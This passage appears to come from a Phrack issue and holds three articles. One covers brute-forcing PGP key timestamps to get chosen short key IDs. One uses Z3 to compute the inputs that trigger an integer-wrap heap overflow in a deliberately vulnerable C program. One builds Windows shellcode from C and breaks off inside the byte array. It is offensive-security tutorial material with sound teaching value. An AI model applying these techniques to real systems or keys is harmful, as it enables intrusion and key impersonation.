+---[ 2 - The spec
+
+So, let's get our hands dirty: grab the OpenPGP spec, RFC 4880 [3], and
+look up how are those key IDs derived [RFC 4880 - 12.2].
+
+--------------[ RFC 4880 - 12.2.  Key IDs and Fingerprints ]---------------
+
+   For a V3 key, the eight-octet Key ID consists of the low 64 bits of
+   the public modulus of the RSA key.
+
+---------------------------------------------------------------------------
+
+Woah, that easy? No, it's not. Version 3 keys are deprecated [RFC 4880 -
+5.5.2], for a bad reason - key IDs collisions, ahem - and a good reason -
+MD5. So, as we don't want to build our new shiny RSA 4098 on MD5, let's
+move on to V4 keys.
+
+--------------[ RFC 4880 - 12.2.  Key IDs and Fingerprints ]---------------
+
+   A V4 fingerprint is the 160-bit SHA-1 hash of the octet 0x99,
+   followed by the two-octet packet length, followed by the entire
+   Public-Key packet starting with the version field.  The Key ID is the
+   low-order 64 bits of the fingerprint.
+
+---------------------------------------------------------------------------
+
+Great, so what's in a Public-Key packet?
+
+-------------[ RFC 4880 - 5.5.2.  Public-Key Packet Formats ]--------------
+
+   A version 4 packet contains:
+
+     - A one-octet version number (4).
+
+     - A four-octet number denoting the time that the key was created.
+
+     - A one-octet number denoting the public-key algorithm of this key.
+
+     - A series of multiprecision integers comprising the key material.
+
+---------------------------------------------------------------------------
+
+Note: numbers are big-endian [RFC 4880 - 3.1]
+
+So the variable parts are the creation timestamp and the key material. The
+key material is a bunch of algorithm-specific MPI [RFC 4880 - 3.2] which
+can't be tampered with without changing their value.
+
+One might also try to add garbage to the packet, but implementations strip
+it. Bummer.
+
+---[ 3 - The attack
+
+Great, we know what constitutes the key ID, and we know that we can tamper
+with the key creation value and/or with the RSA/DSA/Elgamal parameters. I
+decided to only loop through the key creation field for a simple reason: I
+don't trust a crappy tool written by me with RSA primes selection, in
+particular in a scenario like this where a lot of different primes are
+needed, as skews can lead to disastrous consequences [4].
+
+After all entropy usage couldn't be optimized much and at least this way
+we have the peace of mind of GnuPG generated keys.
+
+So we will simply build a bruteforce on the key creation timestamp value.
+
+-----[ 3.1 - Preparation
+
+Ok, let's dive in. First of all fence your GnuPG env, to avoid cluttering
+or damaging your own.
+
+    $ mkdir -m 700 GNUPGHOME && export GNUPGHOME=`pwd`/GNUPGHOME
+
+Now we need to generate a pool of enough keys to have a fair chance of
+finding a match, but how many? Well, obviously it depends on the number of
+seconds in the time frame we consider acceptable for the key creation time.
+
+Let's dive into some math. Since SHA1 is unbiased each try is independent
+and for each try we have a fixed probability of finding a match: one into
+the number of different possible suffixes = 1 / 2^32.
+
+So, the only thing that matters is how many tries we can do. This number
+is s (seconds in the time frame) * x (number of keys in the pool).
+
+The probability of finding a match in k tries is 1 less the probability of
+failing all of them [5] and this last is (prob of failing one) ^ k =
+((2^32 - 1) / 2^32) ^ k.
+
+Here are the final formula and a handy table:
+
+            2^32 - 1   s * x          s = seconds in the time frame
+  y = 1 - ( -------- )                x = number of keys in the pool
+              2^32                    y = probability of a success
+
+  +--------------+------+------+------+------+------+
+  | frame \ prob | 0.50 | 0.75 | 0.90 | 0.95 | 0.99 |
+  +--------------+------+------+------+------+------+
+  |         past |    3 |    5 |    8 |   10 |   15 |
+  +--------------+------+------+------+------+------+
+  |           5y |   19 |   38 |   63 |   82 |  126 |
+  +--------------+------+------+------+------+------+
+  |           1y |   95 |  189 |  314 |  408 |  628 |
+  +--------------+------+------+------+------+------+
+
+For a fancy 3D graph you can plot the probability on a (years in the time
+frame X keys in the keypool) space [6]:
+
+  y = 1 - ((2 ^ 32 - 1) / 2 ^ 32) ^ (60 * 60 * 24 * 365 * a * x)
+
+GnuPG has a convenient function to generate keys in batch mode:
+
+    $ gpg --no-default-keyring --secret-keyring ./secpool.gpg \
+    --keyring ./pubpool.gpg --trustdb-name ./trustpool.gpg \
+    --gen-key --batch batchfile.txt
+
+    # batchfile.txt
+    Key-Type: RSA
+    Key-Length: 4096
+    Name-Real: Filippo Valsorda
+    Name-Comment: f1los0tt1l3
+    Name-Email: f1los0tt1l3@phrack.com
+    Expire-Date: 0
+
+Note: it does not matter what you set in the Name-* fields, as we are
+going to discard the uid to create a validly signed one later.
+
+Set it to run the number of times you want, maybe plug in haveged [7], a
+Geiger or a radio producing white noise and... uh, go grab a coffee.
+
+-----[ 3.2 - The crash
+
+Well, now we have our keypool and we need to bruteforce the key ID out of
+it. I wrote a Python 3 + Cython parallelizable implementation, crash.py.
+
+Compile the Cython module with (you'll need Cython and OpenMP):
+
+    $ python3 setup.py build_ext --inplace
+
+Note: clang and old gcc versions panicked, I used gcc 4.7.
+
+Then start the bruteforce with
+
+    $ python3 crash.py pubpool.gpg NEWKEYID [0xTIMESTAMP]
+
+where 0xTIMESTAMP is the lowest limit to the creation time, if any.
+
+Want to know something cool? The only thing needed to do the bruteforce is
+the pubpool, so you can export it out of your crappy airgapped system and
+perform the number crushing on some powerful untrusted machine.
+
+You will hopefully get a result like this
+
+  Current fingerprint: 9b179a2af2f8a744b2214de4eec578f57e61d52a
+  Current timestamp: 0x512187c9
+  NEW fingerprint: d8efd70f8479432e9158ac27eb56af7c42424242
+  RESULT timestamp: 0x1b550652
+
+------[ 3.2.1 - Runtime stats
+
+The bulk of the heavy-lifting involved in this bruteforce is making the
+SHA1 hashes, and one of them is done for each timestamp tried. The number
+of tries is clearly independent of the width of the time frame, and grows
+with the probability of finding a match. The two - probability and tries -
+are bound by a simplified version of the formula above.
+
+            2^32 - 1   x
+  y = 1 - ( -------- )                x = tries / SHA1 hashes
+              2^32                    y = probability of a success
+
+So what matters here is what SHA1 hashrate we manage to get. The crash.py
+Cython implementation is quite fast, and achieves 3.0 * 10^6 h/s on a
+quad-core 2.3 GHz i7 or 8.3 * 10^6 h/s on a AWS EC2 cc2.8xlarge instance.
+
+Note: this means that a matching key would cost you $0.50 of Spot Instance
+as of April 2013.
+
+However, much better can be done: the oclHashcat-plus guys claim a 3.081 *
+10^9 SHA1/s on a AMD hd6990 GPU [8]. With an hashrate like that, a match
+can be found in a matter of seconds. Writing a high-performance CUDA or
+OpenGL implementation is left as an exercise to the reader ;)
+
+Here is a reference table of running times:
+
+  +----------------+------+------+------+------+------+
+  |    probability | 0.50 | 0.75 | 0.90 | 0.95 | 0.99 |
+  +----------------+------+------+------+------+------+
+  |   tries / 10^9 |  2.9 |  5.9 |  9.8 | 12.8 | 19.7 |
+  +----------------+------+------+------+------+------+
+  |  runtime on i7 |  17m |  33m |  55m |  71m | 110m |
+  +----------------+------+------+------+------+------+
+  | runtime on EC2 |   6m |  12m |  20m |  26m |  40m |
+  +----------------+------+------+------+------+------+
+  | runtime on GPU |   1s |   2s |   3s |   4s |   6s |
+  +----------------+------+------+------+------+------+
+
+-----[ 3.3 - The patch
+
+Now we have to patch the key. patch.py, incredibly, does exactly so.
+
+First, export the secret key for which you had the match
+
+    $ gpg --no-default-keyring --secret-keyring ./secpool.gpg \
+    --keyring ./pubpool.gpg --export-secret-keys OLDKEYID > privkey.gpg
+
+Then run patch.py on it, passing it the "RESULT timestamp" from crash.py:
+
+    $ python3 patch.py privkey.gpg TIMESTAMP > resultkey.gpg
+
+Finally, force gpg to import the key even if the (invalid) bounding
+signature has been stripped:
+
+    $ gpg --allow-non-selfsigned-uid --import resultkey.gpg
+
+And restore the bounding signature by creating a new uid:
+
+    $ gpg --edit-key NEWKEYID
+
+    gpg> adduid
+    gpg> uid 1
+    gpg> deluid
+    gpg> trust
+    gpg> check
+    gpg> save
+
+Note: don't create the new uid as an exact copy of the old, otherwise
+deluid will delete both of them from the secret key - it's a GnuPG bug.
+
+Done! You now have your new shiny PGP key with a personal key ID. Export
+it to your main GnuPG env or whatever.
+
+---[ 4 - Conclusion
+
+Have fun, there are still many interesting uncatched key IDs out there:
+0x11111111, 0xabaddeed, 0xaaaaaaaa, 0xg00d1dea, 0x27182818, 0x14142135...
+Please just leave 0x31415926, 0x42424242 and 0x13371337 for me ;) and
+don't (publicly) duplicate other people's keys.
+
+Finally, I know what you are searching for: the option is --keyid-format
+long ;)
+
+---[ 5 - References
+
+[1] "PGP CPU time wasta (never refer to pgp key using 32bit key-id)"
+http://seclists.org/fulldisclosure/2010/May/120
+[2] "Short key IDs are bad news (with OpenPGP and GNU Privacy Guard)"
+http://www.asheesh.org/note/debian/short-key-ids-are-bad-news.html
+[3] "OpenPGP Message Format" - Callas, et al - November 2007
+https://tools.ietf.org/html/rfc4880
+[4] "Cryptanalysis of RSA with Small Prime Difference" - B de Weger - 2002
+http://www.enseignement.polytechnique.fr/profs/informatique/Francois.Morain
+/Master1/Crypto/projects/Weger02.pdf
+[5] Complementary event - Wikipedia
+https://en.wikipedia.org/w/index.php?title=Complementary_event&oldid=545752
+375#Example_of_the_utility_of_this_concept
+[6] y = 1 - ((2 ^ 32 - 1) / 2 ^ 32) ^ (60 * 60 * 24 * 365 * a * x) with a
+from 1 to (2013 - 1970) with x from 1 to 200 - Wolfram|Alpha
+http://wolfr.am/YxKsTU
+[7] haveged - A simple entropy daemon
+http://www.issihosts.com/haveged/
+[8] oclHashcat-plus - advanced password recovery | Performance section
+http://hashcat.net/oclhashcat-plus/
+
+---[ 6 - Code
+
+|=[ 0x05 ]=---=[ How to cheat at maths - chown ]=------------------------=|
+
+
+|=-----------------------------------------------------------------------=|
+|=----------------------=[ How I Cheat at Maths - Z3 101 ]---------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------------------=[ by chown ]=--------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Introduction
+
+Welcome reader. I am writing this small text because it has recently come
+to my attention that a lot of people significantly smarter than me are
+intimidated by the mention of Z3 and solvers in general, and avoid using
+them. I think it is a common mentality that Z3 requires some kind of maths
+degree as a prerequisite for its use, however for me it is the complete
+opposite. 
+
+Hopefully by the end of this small guide you will see that Z3 can provide a
+trivial platform with which you can avoid doing most of the complex math
+work which is associated with exploit development and reverse engineering.
+
+--[ What is Z3?
+
+Z3 is an SMT (satisfiability modulo theories) solver written by Microsoft
+Research. It is cross platform, (Windows/Linux/Mac OS X) and free (MIT
+License).
+
+Internally at Microsoft it is used for program analysis and verification.
+
+Z3 exposes either a C or Python based API, with a rich set of features. In
+this paper we will only scratch the surface of the Python API. I feel this
+is the simplest way to jump right in and instantly get value from Z3 with
+almost no learning curve required. There is a lot of documentation on the
+web if you wish to venture deeper into the functionality of Z3. 
+
+--[ Installing Z3
+
+Installing Z3 is a simple process, and as i mentioned, can be done on most
+operating systems. The source code to Z3 is available from the Z3 Github
+page (2). 
+
+The build instructions for Mac OS X are simply as follows:
+
+    CXX=clang++ CC=clang python scripts/mk_make.py
+    cd build
+    make
+    sudo make install
+
+For Ubuntu it is even simpler:
+
+    sudo apt-get install python-z3
+
+Once this is done, the Python module can be used by simply using "import
+z3" from within Python.
+
+--[ Introduction to Z3
+
+To whet your appetite, we will first explore a simple maths example
+unrelated to exploit development. The following small puzzle was being
+passed around social media sites:
+
+    A+B   = 240
+    C+D   = 500
+    D-B+C = 455
+    A+C   = 215
+    What answer for D?
+
+While this can easily be solved with math, it is much easier to make Z3 do
+all the work for us.
+
+The first step in our solver is to import z3 and declare some variables for
+use in the solver. The following code creates 4 Int() type variables.
+A,B,C,D and initiates the solver class. 
+
+Note: The string passed to each variable is used to label the results when 
+the model is printed at the end.
+
+    #!/usr/bin/env python
+
+    from z3 import *
+
+    # Declare our variables
+    A = Int('A')
+    B = Int('B')
+    C = Int('C')
+    D = Int('D')
+
+    s = Solver()
+
+Now that we have our variables declared, we must define some simple
+constraints for the solver. Basically we need to take each line in the
+above problem and convert it to an expression using our variables.
+
+    # Add the constraints
+    s.add(A + B == 240)  # A+B   = 240
+    s.add(C + D == 500)  # C+D   = 500
+    s.add(D-B+C == 455)  # D-B+C = 455
+    s.add(A+C == 215)    # A+C   = 215
+
+The final steps are to use the check() function to solve the problem and
+print the model at the end.
+
+    print "[+] Solving..."
+    s.check()
+    ttt = s.model()
+    print "[MODEL---------------------------------------]"
+    print ttt
+    print "[--------------------------------------------]"
+
+Running this code provides the following output:
+
+    $ python facebook.py 
+    [+] Solving...
+    [MODEL---------------------------------------]
+    [C = 20, B = 45, D = 480, A = 195]
+    [--------------------------------------------]
+
+As you can see, it only took a couple of minutes to code a solver for this
+problem and we got the answer D=480. Congratulations, if you followed this
+far you can now cheat at facebook and impress your friends!!!
+
+I have included the sample code for this (facebook.py) in the appendix.
+
+--[ Z3 and Exploit dev
+
+As I'm sure you can now imagine there are a billion small math problems
+like this in exploit development. Some typical examples for me are:
+
+* Solving input values to control allocation/copy sizes.
+* Root causing a fuzz crash, one constraint for each cmp instruction, then
+  control register contents as needed.
+* Finding input values which constrain to certain criteria.
+* etc.
+
+To make this more clear, I have written a small vulnerable program with
+which we can look at the exploitation process and how Z3 can help us.
+
+----[ Vulnerable example
+
+The following example code has a clearly visible integer wrap
+vulnerability. We can obviously utilize this to cause a heap overflow into
+the chunk pointed to by sstr.
+
+Have a quick read over the code below, and afterwards I will explain the
+challenges involved in solving this problem.
+
+     1  #include <stdio.h>
+     2  #include <stdlib.h>
+     3  #include <string.h>
+     4  
+     5  #define HEADER "-------------------------------------------[ ASCII
+DIAGRAM ]----------------------------------------------------\n"
+     6  #define HDRLEN strlen(HEADER)
+     7  
+     8  char *copyandupdate(char *dst,char *src, unsigned int size)
+     9  {
+    10      memcpy(dst,src,size);
+    11      dst += size;
+    12      return dst;
+    13  }
+    14  
+    15  int main(int argc, char *argv[])
+    16  {
+    17      unsigned int width,height,i;
+    18      char *sstr,*fstr;
+    19  
+    20      if(argc != 3) {
+    21          printf("usage: %s <width> <height>\n",argv[0]);
+    22          exit(-1);
+    23      }
+    24  
+    25      width  = strtoul(argv[1],NULL,0);
+    26      height = strtoul(argv[2],NULL,0);
+    27  
+    28  
+    29      printf("[+] Using width: %u\n",width);
+    30      printf("[+] Using height: %u\n",height);
+    31  
+    32      if(width < 5) {
+    33          printf("error: Width too small\n");
+    34          exit(1);
+    35      }
+    36  
+    37      if((width * height + HDRLEN) > 0x3fffffff) {
+    38          printf("error: Table too large (%u) \n",width *
+height);
+    39          exit(1);
+    40      }
+    41  
+    42      printf("[+] Allocating buffer sized: %u\n", width * height
++ HDRLEN);
+    43      sstr = fstr = malloc(width * height + HDRLEN);
+    44      if(!fstr) {
+    45          printf("error: Out of Memory!\n");
+    46          exit(1);
+    47      }
+    48  
+    49      printf("[+] Writing header to buffer (%u bytes)\n",HDRLEN);
+    50      fstr = copyandupdate(fstr,HEADER,HDRLEN);
+    51      for(i = 0 ; i < height ; i++ )
+    52      {
+    53          char *m = malloc(width);
+    54          if(!m) {
+    55              printf("error: Out of Memory!\n");
+    56              break;
+    57          }
+    58          memset(m,'X',width);
+    59          m[width-3] = '\r';
+    60          m[width-2] = '\n';
+    61          m[width-1] = '\x00';
+    62          fstr = copyandupdate(fstr,m,width-1);
+    63          free(m);
+    64      }
+    65  
+    66      printf(sstr);   
+    67  
+    68  }
+    69  
+
+As I'm sure you saw, this code takes a width and height parameter from the
+command line and creates an ascii table containing the appropriate number
+of X's.
+
+Here is some sample output from a successful run:
+
+$ ./asciigrid 30 10
+[+] Using width: 30
+[+] Using height: 10
+[+] Allocating buffer sized: 413
+[+] Writing header to buffer (113 bytes)
+-------------------------------------------[ ASCII DIAGRAM
+]----------------------------------------------------
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+The major vulnerability in this source code occurs between lines 37 and
+43 in the source. As you can see below, the code takes the width and height
+parameters and checks to make sure that the product of width * height plus
+the length of the header is < 0x40000000. Next it allocates a buffer based
+on these values. However, if width and height is large enough to create an
+integer wrap, the resulting buffer allocation will not correlate to the
+width and height values themselves, creating potential for a heap overflow.
+
+    37      if((width * height + HDRLEN) > 0x3fffffff) {
+    38          printf("error: Table too large (%u) \n",width *
+height);
+    39          exit(1);
+    40      }
+    41  
+    42      printf("[+] Allocating buffer sized: %u\n", width * height
++ HDRLEN);
+    43      sstr = fstr = malloc(width * height + HDRLEN);
+
+Once this allocation is performed, the program begins by writing the HEADER
+field into the buffer. Depending on the size of the buffer this will either
+be inside or outside the allocated buffer. Due to the wrapping allocation
+size calculation, there is no guarantee at this stage that a large enough
+allocation was performed to house the HEADER field. 
+
+Finally at line 51, a copy loop is performed. For each of the lines in
+height an allocation of "width" bytes is performed. This is then populated
+with a line of X's, and copied into the buffer. Obviously if our values are
+large enough to wrap, this loop will end up writing all the way out of
+bounds of our buffer, but it also has no way to stop copying, therefore it
+will write all the way until it hits an unmapped page, causing program
+termination.
+
+    51          for(i = 0 ; i < height ; i++ )
+    52          {
+    53                  char *m = malloc(width);
+    54                  if(!m) {
+    55                          printf("error: Out of Memory!\n");
+    56                          break;
+    57                  }
+    58                  memset(m,'X',width);
+    59                  m[width-3] = '\r';
+    60                  m[width-2] = '\n';
+    61                  m[width-1] = '\x00';
+    62                  fstr = copyandupdate(fstr,m,width-1);
+    63                  free(m);
+    64          }
+
+Luckily for us (;)) there does exist a clean way out of this loop. If the
+malloc allocation of width bytes fails, the loop is exited, and the program
+continues.
+
+This means, if we can wrap the allocation while having a large enough width
+to force the allocation to fail, we are able to perform our overflow
+(copying the header out of bounds) without program termination occurring.
+(This gives us an opportunity to utilize our overflow). The question is,
+what input values will allow all this to happen?
+
+---[ Solving
+
+As you can imagine, the next step in our process is to write a simple
+solver to calculate these values for us. Once again the process is very
+simple
+
+We begin by importing our library:
+
+     1  #!/usr/bin/env python
+     2  
+     3  from z3 import *
+     4  
+
+Next we need to declare the variables used by our sample program. The first
+variables which we need are the width and height variables. In the previous
+example we used Int() type variables. However, in this case, we use a
+BitVec() type. The main difference between these two types in Z3 is the
+ability to perform binary operations on the BitVec. Also we are able to
+specify the exact size of the variable, this lets us more easily simulate
+integer wraps. In this example I am targeting a 32-bit platform, therefore
+I use the size 32 for each variable. We also need a variable to hold the
+size of the header, this is not strictly necessary but provides a more
+clear output in my opinion.
+
+     5  width = BitVec('width', 32)
+     6  height = BitVec('height', 32)
+     7  headersize = BitVec('headersize',32)
+     8  
+
+Next, I create a convenience variable allocsize. This is used to hold the
+result of the calculation. Instead of this variable we could simple write
+width * height + headersize each time, however if we did this, the size of
+the allocation would not be visible in the printed model. Since we care
+about this size, it makes sense to use a convenience variable.
+
+     9  allocsize = BitVec('allocsize',32)
+    10  
+    11  s = Solver()
+    12  
+
+Now that we've declared our variables and initialized the Solver the next
+step is to add constraints to our model. The first constraint in this
+program is simply declaring the headersize value. This is done with the
+following line:
+
+    13  s.add(headersize == 113)
+
+The next constraint we can add, is to make sure that width by itself is
+enough to cause the allocation to fail, an easy way to do this is to make
+sure it is above 0xf0000000, since this would be large enough for a 32-bit
+process to fail. You may notice that we used a function "UGT" for this,
+rather than the > operator. The reason for this is that the > operator by
+default will perform a signed comparison. UGT (unsigned greater than) will
+provide us with the unsigned functionality we need. As you can imagine the
+counter function to this ULT() will perform an unsigned less than
+comparison. Reading the help for the module will show many other useful
+functions similar to this.
+
+    14  s.add(UGT(width,0xf0000000)) # For malloc fail
+
+Obviously, we need a constraint to calculate allocsize. This is simply a
+case of performing the same calculation directly from the source code.
+
+    15  s.add(allocsize == width * height + headersize)
+
+We then make sure that the allocsize is less than the headersize, so that
+an overflow occurs.
+
+    16  s.add(ULT(allocsize & 0xffffffff,headersize))
+    17  
+
+Finally, we solve and print the model...
+
+    20  print "[+] Solving..."
+    21  s.check()
+    22  ttt = s.model()
+    23  print "[MODEL---------------------------------------]"
+    24  print ttt
+    25  print "[--------------------------------------------]"
+
+If we run this solver, the following values are generated:
+
+    $ python solver.py 
+    [+] Solving...
+    [MODEL---------------------------------------]
+    [height = 2318056819,
+     width = 4192030789,
+     allocsize = 112,
+     headersize = 113]
+    [--------------------------------------------]
+
+Inputting this into the target program confirms our technique, an
+allocation of 112 bytes is performed and then a header (113) bytes is
+written to it. Finally an allocation fails, and the loop is exited, then
+the buffer is printf'ed. (in a vulnerable way... ;) )
+
+$ ./asciigrid 4192030789 2318056819
+[+] Using width: 4192030789
+[+] Using height: 2318056819
+[+] Allocating buffer sized: 112
+[+] Writing header to buffer (113 bytes)
+asciigrid(98654,0xa33e5000) malloc: *** mach_vm_map(size=4192034816) failed
+(error code=3)
+*** error: can't allocate region
+*** set a breakpoint in malloc_error_break to debug
+error: Out of Memory!
+-------------------------------------------[ ASCII DIAGRAM
+]----------------------------------------------------
+
+Finding a way to leverage this overflow is outside of the scope of this
+paper, however I have personally leveraged a very similar situation in a
+real life application.
+
+
+---[ Adding constraints to enumerate possibilities?
+
+In the above example, the solver gave us a situation where the buffer was
+sized 1 byte smaller than the copy, however, in real life, most allocators
+naturally align sizes before returning a chunk to the program. This means
+that in the above example, no overflow would actually take place. Also with
+the above situation, we often want to enumerate the QUANTUM sizes which we
+can utilize on the heap, so we can look for overflow targets etc.
+
+Z3 is not really designed for this, solving all permutations, and is more
+designed for solving a single one. However, we can easily cheat by adding
+additional constraints to the program. A simple example of this, since we
+know that a buffer size of 112 is possible, we simply add a constraint
+making sure that allocsize is less than that. 
+
+     s.add(ULT(allocsize & 0xffffffff,112))
+
+Solving again, we can see that an allocsize of 98 is possible. Since this
+is code we can easily wrap this in a loop to enumerate all possibilities.
+
+    [+] Solving...
+    [MODEL---------------------------------------]
+    [allocsize = 98,
+     height = 732446463,
+     width = 4167741711,
+     headersize = 113]
+    [--------------------------------------------]
+
+--[ Conclusion
+
+Hopefully this small guide is useful to you. I find myself using these
+small solvers constantly during exploit dev. Some other areas that these
+help with are, during auditing - to confirm findings, during exploitation -
+to calculate values on the fly. I'm sure once you start playing with this
+library you will do the same. 
+
+--[ References
+
+1. https://z3.codeplex.com/ - Z3 Home Page
+2. https://github.com/Z3Prover/z3 - Z3 github page
+
+--[ Appendix: Source code
+
+|=[ 0x06 ]=---=[ Shellcode the better way, or
+                 how to just use your compiler - fishstiqz ]=------------=|
+
+
+|=-----------------------------------------------------------------------=|
+|=----=[ Shellcode the better way, or how to just use your compiler ]----=|
+|=-----------------------------------------------------------------------=|
+|=---------------------------=[ by fishstiqz ]=--------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Introduction
+
+Back in the prehistoric days of memory corruption bugs and exploitation,   
+exploit developers used our primitive tools to construct rudimentary
+payloads in assembly language. Those days are long past. In this small
+paper I will investigate some methods for anyone still stuck in the good
+ol' days of yore using their assembler.
+
+--[ Prerequisites
+
+This writeup uses the MinGW compiler to demonstrate generating shellcode
+from C for running on Windows systems. The same concepts should apply to
+other compilers (such as MSVC) with some tweaking. The python scripts also
+use the 'pefile' library from erocarrera in order to extract the compiled
+code.
+
+To quickly get started compiling on a linux system, do something like:
+
+    $ sudo apt-get install gcc-mingw-w64
+    $ pip install pefile
+
+--[ Concepts
+
+There is nothing special about shellcode as opposed to any other compiled
+code. A shellcode is simply some piece of machine code that typically
+exhibits the following properties:
+
+* Position-independence
+* Entry point at first byte
+* Bootstrap for subsequent execution / further access
+
+Position-independence is basically the only real hurdle faced when
+building shellcode with a C compiler. Strings and imported functions will
+need to be handled inline. All code will need to placed in one section
+and will need to be ordered appropriately in order to ensure everything is
+appropriately extracted and relative jumps are correct.
+
+This paper will not deal with creating shellcodes that are intended to
+bypass filters. In the extremely rare event that a filter is necessary
+(when is the last time you actually needed one in your browser exploit?)
+it is best to write an encoder and decoder.
+
+--[ Inlining strings
+
+Inlining strings is quite easily accomplished with inline assembly as in
+the following macro:
+
+    #define INLINE_STR(name, str) \
+        const char * name;          \
+        asm(                        \
+            "call 1f\n"             \
+            ".asciz \"" str "\"\n"  \
+            "1:\n"                  \
+            "pop %0\n"              \
+            : "=r" (name)           \
+        );
+
+This is how it would be used:
+
+    INLINE_STR(kernel32, "kernel32");
+    PVOID pKernel32 = scGetModuleBase(kernel32);
+
+Unfortunately MinGW doesn't have a way to inline a unicode string nor does
+MSVC have inline assembly for x64 so a different method must be employed
+when these are being used.
+
+One potential way to handle unicode strings would be to generate an inline
+sequence of .db bytes as a pre-compile step. For MSVC, writing strings one
+character at a time to a stack buffer also works but is quite ugly.
+
+--[ Ordering functions
+
+The Makefile included with the source code makes use of the
+-fno-toplevel-reorder switch which causes code to be generated in the same
+order they appear in the source files. The Makefile also uses
+-falign-functions=1 to reduce padding between functions and generate
+smaller code.
+
+Each function is also marked with an attribute forcing them to be
+placed into a custom section.
+
+    #define SCFUNC __attribute__((section("sccode")))
+
+This custom section makes extraction of the final code very simple
+as all shellcode functions will be placed into the "sccode" section
+and ordered appropriately.
+
+In MSVC an order file can be specified with /ORDER to achieve the
+same effect.
+
+--[ Example shellcode
+
+The following is a quick GetProcAddress implementation in C which
+will be used for the examples here.
+
+    SCFUNC PVOID scGetModuleBase(const char *moduleName)
+    {
+        PPEB pPeb;
+        PLIST_ENTRY head, entry;
+        PLDR_DATA_TABLE_ENTRY module;
+
+    #if defined(_M_IX86)
+        pPeb = (PPEB) __readfsdword(0x30);
+    #elif defined(_M_X64)
+        pPeb = (PPEB) __readgsqword(0x60);
+    #endif
+
+        head = &pPeb->Ldr->InLoadOrderModuleList;
+        entry = head->Flink;
+
+        while (entry != head)
+        {
+            module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY,
+            InLoadOrderModuleList);
+            if (scW2Anicmp(module->BaseDllName.Buffer, moduleName, scStrlen
+            (moduleName)) == 0)
+                return module->DllBase;
+            entry = entry->Flink;
+        }
+
+        return NULL;
+    }
+
+    SCFUNC PVOID scGetProcAddr(PVOID modBase, const char *exportName)
+    {
+        LPVOID pFunc = NULL;
+        PBYTE pMod = (PBYTE)modBase;
+        PIMAGE_NT_HEADERS pNt = GET_NT_HEADERS(pMod);
+        PIMAGE_DATA_DIRECTORY pDir = &GET_DIRECTORY(pNt,
+        IMAGE_DIRECTORY_ENTRY_EXPORT);
+        PIMAGE_EXPORT_DIRECTORY pExportDir;
+        WORD *pOrdinal;
+        DWORD *pName;
+        DWORD *pFuncs;
+        DWORD i;
+
+        // get the export directory
+        pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pMod + pDir->
+        VirtualAddress);
+
+        // sanity check the export directory
+        if (pDir->Size == 0 || pExportDir->NumberOfFunctions == 0 ||
+        pExportDir->NumberOfNames == 0)
+            return NULL;
+
+        // iterate the exported names
+        pName = (DWORD *) (pMod + pExportDir->AddressOfNames);
+        pOrdinal = (WORD *) (pMod + pExportDir->AddressOfNameOrdinals);
+
+        // hi EMET!
+        pFuncs = (DWORD *) (pMod + pExportDir->AddressOfFunctions);
+
+        for (i = 0; i < pExportDir->NumberOfNames; i++, pName++,
+        pOrdinal++)
+        {
+            if (scStrcmp(exportName, (const char *)(pMod + *pName)) == 0)
+            {
+                // found the name, get the function
+                pFunc =  pMod + pFuncs[*pOrdinal];
+                break;
+            }
+        }
+
+        return pFunc;
+    }
+
+Here you can see a quick calc-pop demonstration using the above code:
+
+    #include <stdio.h>
+    #include <windows.h>
+
+    #include "common.h"
+    #include "pe.h"
+
+    typedef UINT (WINAPI * WinExec_t)(LPCSTR lpCmdLine, UINT uCmdShow);
+
+    SCFUNC void scMain(void)
+    {
+        INLINE_STR(kernel32, "kernel32");
+        INLINE_STR(winexec, "WinExec");
+        INLINE_STR(calc, "calc");
+
+        PVOID pKernel32 = scGetModuleBase(kernel32);
+        WinExec_t pWinExec = (WinExec_t) scGetProcAddr(pKernel32, winexec);
+        if (pWinExec != NULL)
+            pWinExec(calc, 0);
+    }
+
+
+    int main(int argc, char* argv[])
+    {
+        scMain();
+        return 0;
+    }
+
+Thats all there is to the code. Notice that all shellcode functions
+are marked with the SCFUNC attribute and all strings are inlined.
+
+Now to compile and extract the shellcode into a nice header:
+
+    $ i686-w64-mingw32-gcc -fno-toplevel-reorder -falign-functions=1 \
+             -Os -o runcalc.exe runcalc.c common.c pe.c
+    $ python extract.py runcalc.exe
+    // 460 bytes
+    unsigned char shellcode[460] = {
+    0x55,0x89,0xE5,0x56,0x53,0x83,0xEC,0x10,0xE8,0x09,0x00,0x00,
+    0x00,0x6B,0x65,0x72,0x6E,0x65,0x6C,0x33,0x32,0x00,0x58,0x89,
+    0x04,0x24,0xE8,0xD1,0x00,0x00,0x00,0xE8,0x08,0x00,0x00,0x00,
+    0x57,0x69,0x6E,0x45,0x78,0x65,0x63,0x00,0x5E,0x89,0x74,0x24,
+    0x04,0xE8,0x05,0x00,0x00,0x00,0x63,0x61,0x6C,0x63,0x00,0x5B,
+    0x89,0x04,0x24,0xE8,0xFD,0x00,0x00,0x00,0x85,0xC0,0x74,0x0F,
+    0xC7,0x44,0x24,0x04,0x00,0x00,0x00,0x00,0x89,0x1C,0x24,0xFF,
+    0xD0,0x50,0x50,0x8D,0x65,0xF8,0x5B,0x5E,0x5D,0xC3,0x90,0x90,
+    0x55,0x31,0xC0,0x89,0xE5,0x57,0x56,0x53,0x51,0x83,0x7D,0x10,
+    0x00,0x74,0x44,0x31,0xD2,0x8B,0x45,0x08,0x66,0x8B,0x0C,0x50,
+    0x8B,0x45,0x0C,0x8D,0x79,0xBF,0x0F,0xBE,0x1C,0x10,0x0F,0xB7,
+    0xC1,0x66,0x83,0xFF,0x19,0x8D,0x70,0x20,0x0F,0x46,0xC6,0x89,
+    0x45,0xF0,0x8D,0x73,0xBF,0x89,0xF0,0x3C,0x19,0x8B,0x45,0xF0,
